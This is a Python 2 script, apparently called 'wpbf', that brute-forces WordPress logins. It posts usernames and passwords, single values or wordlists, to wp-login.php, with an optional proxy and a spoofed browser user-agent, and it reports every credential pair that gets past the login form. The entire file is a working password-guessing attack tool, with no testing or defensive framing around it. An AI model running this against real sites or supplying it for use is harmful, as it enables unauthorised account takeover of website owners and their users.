#!/usr/bin/python
# -*- coding: utf-8 -*-
import sys
import urllib2, urllib
import cookielib
import re

#
#functions
#

def loadLst(fileName, lstName):
    f = open(fileName, 'r')
    for line in f:
        lstName.append(line.replace('\r\n',''))
    f.close()

if len(sys.argv) <= 1:

    print ''
    print 'Syntax: python wpbf [-u USER|-U FILE] [-p PASS|-P FILE] -h URL [OPT]'
    print ''
    print 'Options:'
    print '-h URL'
    print '-U file contain list user'
    print '-P file contain list password'
    print '-u username'
    print '-p password'
    print '-v verbose mode / show login+pass combination for each attempt'
    print '-f continue after found login/password pair'
    print '-g user-agent - default: "Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.0"'
    print '-x use proxy | ex: 127.0.0.1:1234'
    print ''
    print 'Contoh: python wpbf.py -h http://test.com/wp-login.php -u admin -P password.txt'
    sys.exit()

print 'R!D$'
print 'Mail   : emailkamusayang@gmail.com'

#
#define variables
#

print ""

url = ''
wordlist = ''
username = ''
password = ''
passFile = ''
userFile = ''
signal = 'type="password"'
count = 0
countAcc = 0
mode = 1
verbose = 0
useProxy = 0
continues = 0
agent = 'Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.0'
result = ""


#
#check argvs
#
for arg in sys.argv:
    if arg == '-h':
        url = sys.argv[count + 1]
    elif arg == '-u':
        username = sys.argv[count + 1]
    elif arg == '-U':
        userFile = sys.argv[count + 1]
    elif arg == '-p':
        password = sys.argv[count + 1]
    elif arg == '-P':
        passFile = sys.argv[count + 1]
    elif arg == '-v':
        verbose = 1
    elif arg == '-s':
        signal = sys.argv[count + 1]
    elif arg == '-g':
        agent = sys.argv[count + 1]
    elif arg == '-x':
        lstTmp = sys.argv[count+1].split(':')
        proxyHandler = urllib2.ProxyHandler({lstTmp[0] : lstTmp[1]+':'+lstTmp[2]})
        useProxy = 1
    elif arg == '-f':
        continues = 1
    count += 1


if (len(username)>0 and len(password)>0):
    mode = 1 #single
elif (len(username)>0 and len(passFile)>0):
    mode = 2 #
elif (len(userFile)>0 and len(password)>0):
    mode = 3
elif (len(userFile)>0 and len(passFile)>0):
    mode = 4 

#
#init opener
#
cookieJar = cookielib.CookieJar()
cookieHandler = urllib2.HTTPCookieProcessor(cookieJar)
if useProxy == 0:
    opener = urllib2.build_opener(cookieHandler)
else:
    opener = urllib2.build_opener(proxyHandler,cookieHandler)
opener.addheaders = [('User-agent', agent)]
cookieJar.clear()
cookieJar.clear_session_cookies()

#
#main
#
try:
    response = opener.open(url)
    content = response.read()
    if mode == 1:
        values = {'log' : username,
                      'pwd' : password,
                      'wp-submit' : 'Log In',
                      'redirect_to' : '',
                      'testcookie' : '1' }
        data = urllib.urlencode(values)
        print data
        response = opener.open(url+'/', data)
        strTmp = response.read()
        if strTmp.find(signal) < 0:
            countAcc += 1
            result += "username: " + username + "   password: " + password + "\n"
            print "Valid user--pass: " + username + " -- " + password
            f3 = open('test.html','w')
            f3.write(strTmp)
            f3.close()  
            
    
    
    if mode == 2:
        f = open(passFile,'r')
        for line in f:            
            password = line.strip('\n\r')
            values = {'log' : username,
                      'pwd' : password,
                      'wp-submit' : 'Log In',
                      'redirect_to' : '',
                      'testcookie' : '1' }
            if verbose == 1:
                print "Trying u--p     : " + username + " -- " + password            
            data = urllib.urlencode(values)
            try:
                response = opener.open(url+'/', data)
            except urllib2.URLError, e:
                continue
            strTmp = response.read()
            if strTmp.find(signal) < 0:
                countAcc += 1
                result += "username: " + username + "   password: " + password + "\n"
                print "Valid user--pass: " + username + " -- " + password                
                break;
          


    if mode == 3:
        f = open(userFile,'r')
        for line in f:
            username = line.strip('\n\r')
            values = {'log' : username,
                      'pwd' : password,
                      'wp-submit' : 'Log In',
                      'redirect_to' : '',
                      'testcookie' : '1' }
            if verbose == 1:
                print "Trying u--p     : " + username + " -- " + password
            data = urllib.urlencode(values)
            try:
                response = opener.open(url+'/', data)
            except urllib2.URLError, e:
                continue
            strTmp = response.read()
            if strTmp.find(signal) < 0:
                countAcc += 1                
                result += "username: " + username + "   password: " + password + "\n"
                print "Valid user--pass: " + username + " -- " + password                 
                if continues == 0:
                    break
                cookieJar.clear()
                cookieJar.clear_session_cookies()
                response = opener.open(url)
                content = response.read()

                
       
    if mode == 4:
        f = open(userFile,'r')
        f2 = open(passFile,'r')
        for line in f:
            username = line.strip('\n\r')
            f2.seek(0)
            for line2 in f2:
                password = line2.strip('\n\r')
                values = {'log' : username,
                      'pwd' : password,
                      'wp-submit' : 'Log In',
                      'redirect_to' : '',
                      'testcookie' : '1' }
                if verbose == 1:
                    print "Trying u--p     : " + username + " -- " + password
                data = urllib.urlencode(values)
                try:
                    response = opener.open(url+'/', data)
                except urllib2.URLError, e:
                    continue
                strTmp = response.read()
                if strTmp.find(signal) < 0:
                    countAcc += 1                    
                    result += "username: " + username + "   password: " + password + "\n"
                    print "Valid user--pass: " + username + " -- " + password                     
                    if continues == 0:
                        break;
                    cookieJar.clear()
                    cookieJar.clear_session_cookies()
                    response = opener.open(url)
                    content = response.read()
                    
        f.close()
        f2.close()     
        
    #Finish
    print ''       
    print '1 target successfuly completed, '+ str(countAcc) +' valid username+password found'
    print 'TARGET: ' + url
    print 'RESULT:'        
    print result
    sys.exit()
except urllib2.URLError, e:
    print "\n\t[!] Session Cancelled; Error occured. Check internet settings"
except (KeyboardInterrupt):
    print "\n\t[!] Session cancelled"
